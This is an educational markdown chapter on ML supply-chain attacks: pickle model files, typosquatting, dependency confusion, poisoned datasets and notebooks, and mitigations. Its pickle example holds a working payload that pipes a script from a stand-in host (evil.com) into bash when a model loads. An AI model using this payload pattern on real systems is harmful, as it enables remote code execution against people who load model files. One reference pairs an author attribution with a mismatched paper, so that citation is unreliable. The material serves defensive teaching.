# 07 — Supply Chain Attacks

## Concept

The AI/ML ecosystem relies heavily on shared components: pre-trained model weights, public datasets, Python packages, and cloud-hosted model hubs. **Supply Chain Attacks** target these upstream dependencies to compromise downstream consumers without ever directly attacking their systems.

The attack surface is vast: a single malicious model on Hugging Face or a compromised PyPI package can affect thousands of applications.

---

## Attack Surfaces

| Layer | Asset | Threat |
|-------|-------|--------|
| **Data layer** | Public datasets (Kaggle, HuggingFace datasets) | Poisoned samples, malicious content |
| **Model layer** | Pre-trained weights (HuggingFace Hub, TF Hub) | Backdoored models, arbitrary code execution via pickle |
| **Library layer** | PyPI/Conda packages (transformers, torch, scikit-learn) | Typosquatting, dependency confusion, compromised maintainer |
| **Notebook layer** | Jupyter notebooks shared in repos | Malicious cells that execute on open |
| **Pipeline layer** | MLOps tools (MLflow, DVC, Weights & Biases) | Compromised experiment metadata or artifacts |
| **Infrastructure layer** | Cloud training instances, CI/CD | Compromised training infrastructure exfiltrates data/models |

---

## How It Works

### Pickle Exploit (Most Critical)
PyTorch's default serialisation format (`torch.save` / `torch.load`) uses Python's `pickle` module. A malicious model file can execute arbitrary code when loaded:

```python
# Attacker creates a malicious "model"
import pickle, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("curl http://evil.com/shell.sh | bash",))

payload = MaliciousPayload()
with open("innocent_looking_model.pkl", "wb") as f:
    pickle.dump(payload, f)

# Victim loads the "model" — RCE occurs
import pickle
with open("innocent_looking_model.pkl", "rb") as f:
    model = pickle.load(f)   # <- code executes here
```

### Typosquatting Example
```
Legitimate:  pip install transformers
Malicious:   pip install transfomers   ← one letter swap
             pip install transformer   ← missing 's'
```

### Dependency Confusion Attack
An attacker publishes a public PyPI package with the same name as a private internal package but a higher version number. Python's resolver picks the public (malicious) one.

---

## Real-World Scenarios

### Scenario 1 — Malicious Model on HuggingFace Hub
An attacker uploads a "BERT fine-tuned for sentiment analysis" model. The `.bin` file is a pickle that runs a reverse shell on load. Researchers and engineers download and run it without inspection.

### Scenario 2 — Dataset Poisoning via Wikipedia Edits
Large language models are trained on Wikipedia snapshots. An attacker makes persistent edits containing harmful content or misinformation, which propagates into the model's weights.

### Scenario 3 — Compromised ML Library
An attacker gains access to the PyPI account of a popular ML utility library. They push a new version that exfiltrates API keys and model weights from the user's environment.

### Scenario 4 — Backdoored Pre-trained Model
A widely used image classification checkpoint is replaced (via a compromised maintainer account) with a version that has an embedded backdoor trigger, affecting all applications that use transfer learning from it.

### Scenario 5 — Malicious Jupyter Notebook
A public Colab/Jupyter notebook used for ML tutorials contains a hidden cell that reads `~/.ssh/id_rsa` and uploads it to an attacker-controlled server when executed.

---

## Attack Examples

- [`malicious_pickle_demo.py`](./examples/malicious_pickle_demo.py) — Demonstrates how pickle deserialization leads to code execution.
- [`typosquatting_demo.py`](./examples/typosquatting_demo.py) — Illustrates how package name confusion works.

---

## Mitigations

| Technique | Description |
|-----------|-------------|
| **Use safe serialisation formats** | Prefer `safetensors` over pickle for model weights. |
| **Verify checksums & signatures** | Check SHA-256 hashes of downloaded artifacts against published values. |
| **Scan model files before loading** | Use `picklescan` to detect malicious pickle payloads. |
| **Pin dependency versions** | Lock exact versions of all packages (`pip freeze > requirements.txt`). |
| **Private package registry** | Mirror trusted packages in an internal registry to prevent dependency confusion. |
| **Sandbox model loading** | Load untrusted models in an isolated container/VM. |
| **Vulnerability scanning in CI** | Run `pip-audit`, `safety`, or Dependabot on every pull request. |
| **Model cards & provenance** | Only use models with a clear provenance, institution, and model card. |
| **Least-privilege execution** | Run ML workloads with minimal OS permissions; no internet access if not needed. |

### Mitigation Code
- [`safe_model_loading.py`](./mitigations/safe_model_loading.py) — Loading models safely with safetensors + checksum verification.
- [`dependency_audit.py`](./mitigations/dependency_audit.py) — Automated dependency vulnerability scanning.

---

## References

- [Biggio & Roli (2018) — Wild Patterns: Ten Years After the Rise of Adversarial Machine Learning](https://arxiv.org/abs/1712.03141)
- [HuggingFace — Pickle Security Warning](https://huggingface.co/docs/hub/security-pickle)
- [Lanyado et al. (2022) — Can You Trust Your Model's Uncertainty? Evaluating Predictive Uncertainty Under Dataset Shift](https://arxiv.org/abs/2209.01726)
- [Snyk — Understanding Dependency Confusion Attacks](https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-pip-gem/)
